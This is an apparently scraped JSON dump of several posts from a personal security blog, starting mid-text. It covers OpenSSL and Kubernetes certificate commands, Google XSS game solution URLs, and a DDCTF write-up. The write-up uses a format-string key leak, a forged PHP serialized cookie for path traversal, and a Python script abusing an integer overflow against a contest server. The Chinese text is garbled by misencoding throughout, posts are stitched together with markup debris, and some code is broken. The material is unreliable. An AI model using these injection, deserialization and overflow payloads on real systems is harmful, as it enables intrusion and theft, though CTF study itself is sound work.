-oaep openssl rsautl -decrypt -in flag.enc-inkey private.key -out flag.dec -pkcs K8såœºæ™¯ä¸‹çš„è¯ä¹¦ç®¡ç† é¦–å…ˆä¸ºé›†ç¾¤ç”Ÿæˆä¸€ä¸ªè¯ä¹¦, ä»£è¡¨CAç­¾å‘æœºæ„\n# ç”Ÿæˆ2048ä½çš„åŒ…å«å…¬é’¥å’Œç§é’¥çš„æ–‡ä»¶ openssl genrsa -out ca.key 2048 # åœ¨ca.keyæ–‡ä»¶åŸºç¡€ä¸Šç”Ÿæˆca.crt openssl req -x509 -new -nodes -key ca.key -subj \u0026#34;/CN=${MASTER_IP}\u0026#34; -days 10000 -out ca.crt ç„¶ååˆ›å»ºä¸€ä¸ªæœåŠ¡ç«¯è¯ä¹¦\n# ç”Ÿæˆä¸€ä¸ª2048ä½çš„server.keyæ–‡ä»¶ openssl genrsa -out server.key 2048 åˆ›å»ºä¸€ä¸ªç”¨äºç”Ÿæˆè¯ä¹¦ç­¾åè¯·æ±‚ï¼ˆCSRï¼‰çš„é…ç½®æ–‡ä»¶ã€‚ ä¿å­˜æ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼šcsr.confï¼‰å‰ï¼Œè®°å¾—ç”¨çœŸå®å€¼æ›¿æ¢æ‰å°–æ‹¬å·ä¸­çš„å€¼ï¼ˆä¾‹å¦‚ï¼š\u0026lt;MASTER_IP\u0026gt;ï¼‰ã€‚ æ³¨æ„ï¼šMASTER_CLUSTER_IP å°±åƒå‰ä¸€å°èŠ‚æ‰€è¿°ï¼Œå®ƒçš„å€¼æ˜¯ API æœåŠ¡å™¨çš„æœåŠ¡é›†ç¾¤ IPã€‚ ä¸‹é¢çš„ä¾‹å­å‡å®šä½ çš„é»˜è®¤ DNS åŸŸåä¸º cluster.localã€‚\n[ req ] default_bits = 2048 prompt = no default_md = sha256 req_extensions = req_ext distinguished_name = dn [ dn ] C = \u0026lt;country\u0026gt; ST = \u0026lt;state\u0026gt; L = \u0026lt;city\u0026gt; O = \u0026lt;organization\u0026gt; OU = \u0026lt;organization unit\u0026gt; CN = \u0026lt;MASTER_IP\u0026gt; [ req_ext ] subjectAltName = @alt_names [ alt_names ] DNS.1 = kubernetes DNS.2 = kubernetes.default DNS.3 = kubernetes.default.svc DNS.4 = kubernetes.default.svc.cluster DNS.5 = kubernetes.default.svc.cluster.local IP.1 = \u0026lt;MASTER_IP\u0026gt; IP.2 = \u0026lt;MASTER_CLUSTER_IP\u0026gt; [ v3_ext ] authorityKeyIdentifier=keyid,issuer:always basicConstraints=CA:FALSE keyUsage=keyEncipherment,dataEncipherment extendedKeyUsage=serverAuth,clientAuth subjectAltName=@alt_names # åŸºäºä¸Šé¢çš„é…ç½®æ–‡ä»¶ç”Ÿæˆè¯ä¹¦ç­¾åè¯·æ±‚ openssl req -new -key server.key -out server.csr -config csr.conf # åŸºäº ca.keyã€ca.crt å’Œ server.csr ç­‰ä¸‰ä¸ªæ–‡ä»¶ç”ŸæˆæœåŠ¡ç«¯è¯ä¹¦ï¼š openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key \\ -CAcreateserial -out server.crt -days 10000 \\ -extensions v3_ext -extfile csr.conf -sha256 # æŸ¥çœ‹è¯ä¹¦ç­¾åè¯·æ±‚ï¼š openssl req -noout -text -in ./server.csr # æŸ¥çœ‹è¯ä¹¦ openssl x509 -noout -text -in ./server.crt å®Œæˆä¹‹å, å°†è¯ä¹¦ä»¬æ·»åŠ åˆ°API Serverçš„é…ç½®æ–‡ä»¶ä¸­\n--client-ca-file=/yourdirectory/ca.crt --tls-cert-file=/yourdirectory/server.crt --tls-private-key-file=/yourdirectory/server.key åœ¨kubectlçš„é…ç½®æ–‡ä»¶ä¸­åŠ å…¥ç”¨æˆ·è¯ä¹¦æ¥æ·»åŠ ç”¨æˆ·(minikubeåœºæ™¯) ä¸ºä»€ä¹ˆå®¢æˆ·ç«¯ä¹Ÿéœ€è¦è¯ä¹¦å‘¢? å› ä¸ºkubectl è¯·æ±‚api serverçš„è¿‡ç¨‹æ˜¯ä¸€ä¸ªåŒå‘è®¤è¯çš„è¿‡ç¨‹, ä¸ä»…ä»…æ˜¯å®¢æˆ·ç«¯éœ€è¦éªŒè¯æœåŠ¡å™¨çš„èº«ä»½, æœåŠ¡å™¨ä¹Ÿéœ€è¦éªŒè¯å®¢æˆ·ç«¯çš„èº«ä»½æ¥å®Œæˆæƒé™é‰´å®š.\nå‚è€ƒhttps://medium.com/@HoussemDellai/rbac-with-kubernetes-in-minikube-4deed658ea7b\nåˆ›å»ºç”¨æˆ·è¯ä¹¦\nmkdir cert \u0026amp;\u0026amp; cd cert openssl genrsa -out user1.key 2048 openssl req -new -key user1.key -out user1.csr -subj â€œ/CN=user1/O=group1â€ # ä½¿ç”¨minikubeçš„caæ¥ç­¾å‘ç”¨æˆ·è¯ä¹¦ openssl x509 -req -in user1.csr -CA ~/.minikube/ca.crt -CAkey ~/.minikube/ca.key -CAcreateserial -out user1.crt -days 500 kubectlä¸´æ—¶ä½¿ç”¨è¯¥ç”¨æˆ·è¯ä¹¦\nkubectl config set-credentials user1 --client-certificate=user1.crt --client-key=user1.key kubectlæ£€æŸ¥é…ç½®\nkubectl config view è¦å°†è¯¥ç”¨æˆ·è®¾ç½®æˆé»˜è®¤è§’è‰², åœ¨.kube/configä¸­æ·»åŠ è¯ä¹¦, ä¾‹å¦‚\napiVersion: v1 clusters: - cluster: certificate-authority: /home/ch4ser/.minikube/ca.crt extensions: - extension: last-update: Wed, 15 Feb 2023 14:46:55 CST provider: minikube.sigs.k8s.io version: v1.28.0 name: cluster_info server: https://192.168.49.2:8443 name: minikube contexts: - context: cluster: minikube extensions: - extension: last-update: Wed, 15 Feb 2023 14:46:55 CST provider: minikube.sigs.k8s.io version: v1.28.0 name: context_info namespace: default user: minikube name: minikube - context: cluster: minikube user: user1 name: user1-context current-context: minikube kind: Config preferences: {} users: - name: minikube user: client-certificate: /home/ch4ser/.minikube/profiles/minikube/client.crt client-key: /home/ch4ser/.minikube/profiles/minikube/client.key - name: user1 user: client-certificate: /home/ch4ser/CloudWorkspace/cert/user1.crt client-key: /home/ch4ser/CloudWorkspace/cert/user1.key åˆ‡æ¢ä¸Šä¸‹æ–‡\nkubectl config use-context user1-context # check kubectl config current-context # åˆ‡å›å» kubectl config use-context minikube ps: kubectl è®¾ç½®ç”¨æˆ·è¯ä¹¦å»è®¿é—®çš„æ—¶å€™, \u0026ndash;tokené€‰é¡¹ä¸ä¼šç”Ÿæ•ˆ, æ— æ³•ä½¿ç”¨tokenå»ä»£è¡¨sa\nè¯·æ±‚ kubernetes API server éœ€è¦ä½¿ç”¨è¯ä¹¦å»è¯·æ±‚, æŸ¥çœ‹.kube/configå¾—åˆ°kubectlè¯ä¹¦ä¹‹å:\ncurl --cert /home/ch4ser/.minikube/profiles/minikube/client.crt --key /home/ch4ser/.minikube/profiles/minikube/client.key -k https://192.168.49.2:8443/api/v1/namespaces å…¶ä¸­192.168.49.2:8443æ˜¯.kube/configä¸­çš„API server åœ°å€\né€ŸæŸ¥: https://help.aliyun.com/document_detail/160530.html\nå…¶ä»– TLS æ˜¯ SSL V2 æ ‡å‡†åŒ–åçš„äº§ç‰©, äº‹å®ä¸Šç°åœ¨å¤§å®¶ç”¨çš„éƒ½æ˜¯tls, åªæ˜¯ä¹ æƒ¯äº†sslè¿™ä¸ªç§°å‘¼ åœ¨ç½‘ç«™å¯ç”¨httpsä¹‹å, ä½¿ç”¨httpè®¿é—®ä¼šè¢«é‡å®šå‘åˆ°443ç«¯å£ä¸Šä»¥ä½¿ç”¨httpsæœåŠ¡ å¦‚æœè¯·æ±‚ä¸­çš„cookieä¸­æœ‰secureå±æ€§, æµè§ˆå™¨åªä¼šå…è®¸è¯¥è¯·æ±‚å‘é€åˆ°httpsæœåŠ¡ä¸­, è€Œä¸æ˜¯http (é™¤äº†å‘å¾€localhost) Insecure sites (with http: in the URL) can\u0026rsquo;t set cookies with the Secure attribute. æ¶‰åŠåˆ°nginxé…ç½®åå‘ä»£ç†åˆ°httpsä¸­å­˜åœ¨çš„å‘å¯ä»¥å‚è€ƒ link\n","permalink":"https://dragonbox.top/posts/tech-openssl/","summary":"\u003cblockquote\u003e\n\u003cp\u003eæ¥çœ‹çœ‹äº’è”ç½‘ä¸–ç•Œçš„åŸºçŸ³\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"é€šä¿¡è¿‡ç¨‹çš„ç®€åŒ–æ¨¡å‹\"\u003eé€šä¿¡è¿‡ç¨‹çš„ç®€åŒ–æ¨¡å‹\u003c/h2\u003e\n\u003ch3 id=\"ç¬¬ä¸€é˜¶æ®µ-æœåŠ¡å™¨å‘caå‘èµ·è¯ä¹¦ç­¾åè¯·æ±‚\"\u003eç¬¬ä¸€é˜¶æ®µ: æœåŠ¡å™¨å‘CAå‘èµ·è¯ä¹¦ç­¾åè¯·æ±‚\u003c/h3\u003e\n\u003cp\u003eæœåŠ¡å™¨ç»„ç»‡ç”Ÿæˆä¸€ä¸ªç§é’¥\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl genrsa -out target.key \u003cspan style=\"color:#ae81ff\"\u003e1024\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä»ç§é’¥æ–‡ä»¶ä¸­å¾—åˆ°å…¬é’¥, è¿™ä¸ªå…¬é’¥ä¼šè¢«ç”¨äºç»™CAç­¾å\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl rsa -in target.key -pubout -out target_pub.key\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä½¿ç”¨ç§é’¥ç”Ÿæˆä¸€ä¸ªè¯ä¹¦ç­¾åè¯·æ±‚, åœ¨ç”Ÿæˆè¿‡ç¨‹ä¸­éœ€è¦å¡«å†™è¯ä¹¦ç”³è¯·äººçš„ä¸€äº›ä¿¡æ¯\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl req -new -key target.key -out target.csr\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç”Ÿæˆå®Œæˆå, å¯ä»¥è¿è¡Œä¸‹é¢å‘½ä»¤çœ‹çœ‹è¿™ä¸ªè¯ä¹¦ç­¾åè¯·æ±‚æ–‡ä»¶é‡Œéƒ½æœ‰ä»€ä¹ˆ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl req -text -in target.csr  -verify\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¾‹å¦‚:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-20221223112026855.png\" alt=\"image-20221223112026855\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eå¯ä»¥çœ‹åˆ°å…¬é’¥ä¹Ÿåœ¨é‡Œé¢.\u003c/p\u003e\n\u003cp\u003eæ¥ä¸‹æ¥æŠŠè¯ä¹¦ç­¾åè¯·æ±‚æ–‡ä»¶æäº¤ç»™CA, CAå®¡æ ¸é€šè¿‡åå¯¹è¯¥æ–‡ä»¶è¿›è¡Œç­¾å\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl x509 -in target.csr -out target.crt -req -signkey ca.key -days \u003cspan style=\"color:#ae81ff\"\u003e365\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003etarget.crtå°±æ˜¯ç­¾åæˆåŠŸåçš„è¯ä¹¦. å¯¹äºå¸¸è§çš„è‡ªç­¾ååœºæ™¯æ¥è¯´, \u003ccode\u003eca.key\u003c/code\u003eå°±æ˜¯\u003ccode\u003etarget.key\u003c/code\u003e, ç”¨è‡ªå·±çš„å¯†é’¥å»ç­¾åè‡ªå·±çš„è¯ä¹¦è¯·æ±‚, è‡ªç­¾åè¯·æ±‚å‘½ä»¤å°±æ˜¯\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl x509 -in target.csr -out target.crt -req -signkey target.key -days \u003cspan style=\"color:#ae81ff\"\u003e365\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åCAå°†target.crtä»¥åŠç”±Root CAç­¾åçš„CAè¯ä¹¦ä¸€åŒè¿”å›ç»™ç”³è¯·äºº. å¦‚ä¸‹å›¾æ‰€ç¤º:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"19QiVdLVN-6NCQPy7Zla1BA.jpeg\" alt=\"img\"  /\u003e\n\u003c/p\u003e","title":"è¯ä¹¦ç›¸å…³"},{"content":"Google Xss game Level 3 This website provides some API (after the arch pointer).\nsolution:\nhttps://xss-game.appspot.com/level3/frame#\u0026lt;img src='foo' onerror=alert();\u0026gt;\nlevel 4 \u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- Internal game scripts/styles, mostly boring stuff --\u0026gt; \u0026lt;script src=\u0026#34;/static/game-frame.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/game-frame-styles.css\u0026#34; /\u0026gt; \u0026lt;script\u0026gt; function startTimer(seconds) { seconds = parseInt(seconds) || 3; setTimeout(function() { window.confirm(\u0026#34;Time is up!\u0026#34;); window.history.back(); }, seconds * 1000); } \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body id=\u0026#34;level4\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/logos/level4.png\u0026#34; /\u0026gt; \u0026lt;br\u0026gt; \u0026lt;img src=\u0026#34;/static/loading.gif\u0026#34; onload=\u0026#34;startTimer(\u0026#39;{{ timer }}\u0026#39;);\u0026#34; /\u0026gt; \u0026lt;br\u0026gt; \u0026lt;div id=\u0026#34;message\u0026#34;\u0026gt;Your timer will execute in {{ timer }} seconds.\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; solution:\nhttps://xss-game.appspot.com/level4/frame?timer=\u0026#39;);alert(\u0026#39; level 5 \u0026lt;!--signup.html--\u0026gt; \u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- Internal game scripts/styles, mostly boring stuff --\u0026gt; \u0026lt;script src=\u0026#34;/static/game-frame.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/game-frame-styles.css\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body id=\u0026#34;level5\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/logos/level5.png\u0026#34; /\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;!-- We\u0026#39;re ignoring the email, but the poor user will never know! --\u0026gt; Enter email: \u0026lt;input id=\u0026#34;reader-email\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;\u0026#34;\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;a href=\u0026#34;{{ next }}\u0026#34;\u0026gt;Next \u0026gt;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; solution:\nhttps://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(\u0026#39;xss\u0026#39;) and click the Next button.\nlevel 6 This website allow user to execute alternative js script\nsolution:\nhttps://xss-game.appspot.com/level6/frame#data:text/plain,alert(\u0026#39;xss\u0026#39;) ","permalink":"https://dragonbox.top/posts/ctf-google-game/","summary":"\u003ch1 id=\"google-xss-game\"\u003eGoogle Xss game\u003c/h1\u003e","title":"Google_Game"},{"content":"è€ƒè¯•å‘¨ç»“æŸï¼Œæœ‰æ—¶é—´æ¥å¤ç°äº†ã€‚ã€‚ã€‚ç„¶é¹…å¥½åƒæœ‰é¢˜ç›®å´©äº†ï¼Œjavaåˆæ²¡å­¦è¿‡ã€‚ã€‚ã€‚åªèƒ½å¤ç°ä¸€éƒ¨åˆ†äº†ã€‚\nweb ç­¾åˆ°é¢˜ ç‚¹å‡»ï¼Œæ‰«æï¼Œå‘ç°é™¤äº†index.php ä¹‹å¤–å…¶ä»–éƒ½éœ€è¦ç™»é™†ï¼ŒæŠ“åŒ…å‘ç°æœ‰å‘é€Auth.phpè¯·æ±‚ï¼Œå…¶ä¸­æœ‰didictf_usernameå­—æ®µï¼Œå°è¯•æ·»åŠ æˆä¸ºdidictf_username: adminã€‚æˆåŠŸç™»é™†ã€‚\nç„¶ååœ¨è¿”å›åŒ…ä¸­æ˜¾ç¤ºå‡ºäº†ä¸€ä¸ªphpæ–‡ä»¶ï¼Œå°è¯•è®¿é—®çœ‹åˆ°äº†Session.phpçš„æºä»£ç å¦‚ä¸‹ï¼š\n\u0026lt;?php Class Application { var $path = \u0026#39;\u0026#39;; public function response($data, $errMsg = \u0026#39;success\u0026#39;) { $ret = [\u0026#39;errMsg\u0026#39; =\u0026gt; $errMsg, \u0026#39;data\u0026#39; =\u0026gt; $data]; $ret = json_encode($ret); header(\u0026#39;Content-type: application/json\u0026#39;); echo $ret; } public function auth() { $DIDICTF_ADMIN = \u0026#39;admin\u0026#39;; if(!empty($_SERVER[\u0026#39;HTTP_DIDICTF_USERNAME\u0026#39;]) \u0026amp;\u0026amp; $_SERVER[\u0026#39;HTTP_DIDICTF_USERNAME\u0026#39;] == $DIDICTF_ADMIN) { $this-\u0026gt;response(\u0026#39;æ‚¨å½“å‰å½“å‰æƒé™ä¸ºç®¡ç†å‘˜----è¯·è®¿é—®:app/fL2XID2i0Cdh.php\u0026#39;); return TRUE; }else{ $this-\u0026gt;response(\u0026#39;æŠ±æ­‰ï¼Œæ‚¨æ²¡æœ‰ç™»é™†æƒé™ï¼Œè¯·è·å–æƒé™åè®¿é—®-----\u0026#39;,\u0026#39;error\u0026#39;); exit(); } } private function sanitizepath($path) { $path = trim($path);//å»æ‰ç©ºæ ¼ $path=str_replace(\u0026#39;../\u0026#39;,\u0026#39;\u0026#39;,$path);//è¿‡æ»¤ç¬¬ä¸€ $path=str_replace(\u0026#39;..\\\\\u0026#39;,\u0026#39;\u0026#39;,$path);//è¿‡æ»¤ç¬¬äºŒ return $path; }// public function __destruct() { if(empty($this-\u0026gt;path)) { exit(); }else{ $path = $this-\u0026gt;sanitizepath($this-\u0026gt;path);// ....//config/flag.php if(strlen($path) !== 18) {//../config/flag.php exit(); } $this-\u0026gt;response($data=file_get_contents($path),\u0026#39;Congratulations\u0026#39;); } exit(); } } ?\u0026gt; \u0026lt;?php include \u0026#39;Application.php\u0026#39;; class Session extends Application { //keyå»ºè®®ä¸º8ä½å­—ç¬¦ä¸² var $eancrykey = \u0026#39;\u0026#39;; var $cookie_expiration\t= 7200; var $cookie_name = \u0026#39;ddctf_id\u0026#39;; var $cookie_path\t= \u0026#39;\u0026#39;; var $cookie_domain\t= \u0026#39;\u0026#39;; var $cookie_secure\t= FALSE; var $activity = \u0026#34;DiDiCTF\u0026#34;; public function index() { if(parent::auth()) { $this-\u0026gt;get_key(); if($this-\u0026gt;session_read()) { $data = \u0026#39;DiDI Welcome you %s\u0026#39;; $data = sprintf($data,$_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]); parent::response($data,\u0026#39;sucess\u0026#39;); }else{ $this-\u0026gt;session_create(); $data = \u0026#39;DiDI Welcome you\u0026#39;; parent::response($data,\u0026#39;sucess\u0026#39;); } } } private function get_key() { //eancrykey and flag under the folder $this-\u0026gt;eancrykey = file_get_contents(\u0026#39;../config/key.txt\u0026#39;); } public function session_read() {//target1: ç»•è¿‡æ‰€æœ‰false if(empty($_COOKIE)) { return FALSE; }//cookie not empty $session = $_COOKIE[$this-\u0026gt;cookie_name]; if(!isset($session)) { parent::response(\u0026#34;session not found\u0026#34;,\u0026#39;error\u0026#39;); return FALSE; }//ddctf_id ä¸èƒ½ä¸ºç©º $hash = substr($session,strlen($session)-32);//é•¿åº¦è¦å¤§äº32? 32ä½ä¹‹åçš„å†…å®¹ $session = substr($session,0,strlen($session)-32);//ä¸€ç›´æˆªæ–­åˆ°å€’æ•°ç¬¬32ä½ if($hash !== md5($this-\u0026gt;eancrykey.$session)) {//key.txt å†…å®¹å’Œ ddctf_id å†…å®¹ç‰‡æ®µæ‹¼æ¥ å†md5 ç­‰äºddctf_id32ä½ä¹‹åçš„å†…å®¹ parent::response(\u0026#34;the cookie data not match\u0026#34;,\u0026#39;error\u0026#39;); return FALSE; } $session = unserialize($session);//ddctf_id ååºåˆ—åŒ– if(!is_array($session) OR !isset($session[\u0026#39;session_id\u0026#39;]) OR !isset($session[\u0026#39;ip_address\u0026#39;]) OR !isset($session[\u0026#39;user_agent\u0026#39;])){ return FALSE; }//ddctf_id ååºåˆ—åŒ–ä¹‹åçš„å†…å®¹è¦æœ‰ session_id ip_address user_agent å†æ¥ä¸ªpath?? if(!empty($_POST[\u0026#34;nickname\u0026#34;])) { $arr = array($_POST[\u0026#34;nickname\u0026#34;],$this-\u0026gt;eancrykey); $data = \u0026#34;Welcome my friend %s\u0026#34;; foreach ($arr as $k =\u0026gt; $v) { $data = sprintf($data,$v); } parent::response($data,\u0026#34;Welcome\u0026#34;); }//sprintæ ¼å¼åŒ–æ‰“å°å‡½æ•°åˆ©ç”¨ï¼Œé€šè¿‡ä¼ é€’è¿›å‚æ•°nickname = %S è®©å®ƒå¯ä»¥è¯»å–keyã€‚ if($session[\u0026#39;ip_address\u0026#39;] != $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]) { parent::response(\u0026#39;the ip addree not match\u0026#39;.\u0026#39;error\u0026#39;); return FALSE; }//ip_address è¦å†™è‡ªå·±çš„ip if($session[\u0026#39;user_agent\u0026#39;] != $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]) { parent::response(\u0026#39;the user agent not match\u0026#39;,\u0026#39;error\u0026#39;); return FALSE; }//user_agent å†…å®¹è¦å’Œ http_user_agentçš„åŒ¹é… return TRUE; }//çœ‹èµ·æ¥å¯ä»¥åŠ¨æ‰‹è„šçš„åªæœ‰session_id? private function session_create() { $sessionid = \u0026#39;\u0026#39;; while(strlen($sessionid) \u0026lt; 32) { $sessionid .= mt_rand(0,mt_getrandmax()); } $userdata = array( \u0026#39;session_id\u0026#39; =\u0026gt; md5(uniqid($sessionid,TRUE)), \u0026#39;ip_address\u0026#39; =\u0026gt; $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;], \u0026#39;user_agent\u0026#39; =\u0026gt; $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;], \u0026#39;user_data\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ); $cookiedata = serialize($ ); $cookiedata = $cookiedata.md5($this-\u0026gt;eancrykey.$cookiedata); $expire = $this-\u0026gt;cookie_expiration + time(); setcookie( $this-\u0026gt;cookie_name, $cookiedata, $expire, $this-\u0026gt;cookie_path, $this-\u0026gt;cookie_domain, $this-\u0026gt;cookie_secure ); } } $ddctf = new Session(); $ddctf-\u0026gt;index(); ?\u0026gt; å¾—åˆ°keyä¹‹åæ„é€ ddctfid:\n\u0026lt;?php //nickname = %s $a = \u0026#39;a:4:{s:10:\u0026#34;session_id\u0026#34;;s:32:\u0026#34;3f65fc339c032f85048e42f21fab4ef0\u0026#34;;s:10:\u0026#34;ip_address\u0026#34;;s:14:\u0026#34;211.137.22.191\u0026#34;;s:10:\u0026#34;user_agent\u0026#34;;s:78:\u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0\u0026#34;;s:9:\u0026#34;user_data\u0026#34;;s:0:\u0026#34;\u0026#34;;}\u0026#39;; $b = unserialize($a); class Application{ public $path = \u0026#39;....//config/flag.txt\u0026#39;; } $key = \u0026#39;EzblrbNS\u0026#39;; $b[\u0026#39;user_data\u0026#39;] = new Application; $d = serialize($b); echo urlencode($d.md5($key.$d)); ä¼ å‚å³å¯ã€‚\nå¤§å‰å¤§åˆ©ä»Šæ™šåƒé¸¡ é‡åˆ°ä¹°ä¸œè¥¿çš„é¢˜ç›®é¦–å…ˆæ€è·¯å°±æ˜¯æ”¹å˜ä»·æ ¼ï¼Œé€šè¿‡æŠ“åŒ…å‘ç°ä»·æ ¼å¯ä»¥å¾€å¤§æ”¹è€Œä¸èƒ½å¾€å°æ”¹ã€‚å¯ä»¥åˆ©ç”¨æ•´æ•°æº¢å‡º0xffffffff+1ï¼Œä¼ å‚è¿›å»å°±ä¹°åˆ°äº†ã€‚ ç„¶åè¦æ·˜æ±°100ä¸ªäººï¼Œå®é™…ä¸Šè¦æ·˜æ±°149ä¸ªäººã€‚è„šæœ¬å¦‚ä¸‹ï¼š\nimport requests import string import random import json import re url = \u0026#39;http://117.51.147.155:5050\u0026#39; seq = [ \u0026#39;register\u0026#39;, \u0026#39;login\u0026#39;, \u0026#39;balance\u0026#39;, \u0026#39;search_ticket\u0026#39;, \u0026#39;bill\u0026#39;, \u0026#39;buy\u0026#39;, \u0026#39;bill\u0026#39;, \u0026#39;pay\u0026#39;] url_seg = { \u0026#39;register\u0026#39;:\u0026#39;/ctf/api/register?name={0}\u0026amp;password=11111111\u0026#39;, \u0026#39;login\u0026#39;:\u0026#39;/ctf/api/login?name={0}\u0026amp;password=11111111\u0026#39;, \u0026#39;balance\u0026#39;:\u0026#39;/ctf/api/get_user_balance\u0026#39;, \u0026#39;search_ticket\u0026#39;:\u0026#39;/ctf/api/search_ticket\u0026#39;, \u0026#39;bill\u0026#39;:\u0026#39;/ctf/api/search_bill_info\u0026#39;, \u0026#39;buy\u0026#39;:\u0026#39;/ctf/api/buy_ticket?ticket_price=4294967296\u0026#39;, \u0026#39;remove\u0026#39;:\u0026#39;/ctf/api/remove_robot?id={0}\u0026amp;ticket={1}\u0026#39;, \u0026#39;pay\u0026#39;:\u0026#39;/ctf/api/pay_ticket?bill_id={0}\u0026#39;} session = requests.session() victiom ={ 1: \u0026#39;21cb23b38e33426812d68991dbb6ba68\u0026#39;, 2: \u0026#39;6f89be1e66c9bd69bce99952aa009a96\u0026#39;, 3: \u0026#39;70e1b0196609646efd0aacea613943d6\u0026#39;, 4: \u0026#39;46f7f7e50b54a636f3aae60dd839590b\u0026#39;, 5: \u0026#39;395b9fb4fb0f3cf42a727d43536be457\u0026#39;, Â·Â·Â· Â·Â·Â· 147: \u0026#39;4cc522f84f11189d9737ab18fc22fcd0\u0026#39;, 148: \u0026#39;8f2675372aa0f2ecfee1aeeee3d814cd\u0026#39;, 149: \u0026#39;7544b9ee45ae6ae7066305d472077638\u0026#39;} def register_login_get_ticket(): global victiom global session while True: username = random.sample(string.letters, 19) username1 = \u0026#39;\u0026#39;.join(username) register1 = url_seg[\u0026#39;register\u0026#39;].format(str(username1)) reg_url = url + register1 print reg_url res = session.get(reg_url).content if \u0026#39;\\u7528\\u6237\\u6ce8\\u518c\\u6210\\u529f\u0026#39; in res: log_url = url + url_seg[\u0026#39;login\u0026#39;].format(username1) session.get(log_url) buy_url = url + url_seg[\u0026#39;buy\u0026#39;] res = session.get(buy_url).content bill_url = url + url_seg[\u0026#39;bill\u0026#39;] html = session.get(bill_url) jsonn = json.loads(html.text) bill_id = jsonn[\u0026#39;data\u0026#39;][0][\u0026#39;bill_id\u0026#39;] pay_url = url + url_seg[\u0026#39;pay\u0026#39;].format(bill_id) session.get(pay_url) sear_url = url + url_seg[\u0026#39;search_ticket\u0026#39;] html = session.get(sear_url) res = html.content josnn = json.loads(html.text) id = josnn[\u0026#39;data\u0026#39;][0][\u0026#39;id\u0026#39;] # 